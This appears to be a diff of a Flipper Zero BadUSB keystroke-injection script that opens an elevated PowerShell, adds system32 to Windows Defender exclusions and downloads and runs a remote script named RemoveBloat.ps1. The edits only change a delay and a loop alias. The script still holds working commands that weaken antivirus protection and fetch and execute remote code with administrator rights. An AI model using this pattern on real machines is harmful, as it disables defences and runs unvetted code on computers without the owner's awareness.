@@ -7,7 +7,7 @@ GUI r
 DELAY 750
 STRING powershell Start-Process powershell -Verb runAs
 CTRL-SHIFT ENTER
-DELAY 1500
+DELAY 1750
 SHIFT TAB
 DELAY 500
 ENTER
@@ -15,5 +15,5 @@ DELAY 1500
 STRING Add-MpPreference -ExclusionPath C:\Windows\system32
 ENTER
 DELAY 750
-STRING New-Object System.Net.WebClient | %{$_.DownloadFile('https://github.com/MFisher14/FlipperZero/blob/main/BadUSB/RemoveBloat.ps1', 'script.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File script.ps1"}, exit
+STRING New-Object System.Net.WebClient | Foreach-Object {$_.DownloadFile('https://github.com/MFisher14/FlipperZero/blob/main/BadUSB/RemoveBloat.ps1', 'script.ps1'); Start-Process powershell.exe -Verb runAs -ArgumentList "-File script.ps1"}, exit
 ENTER
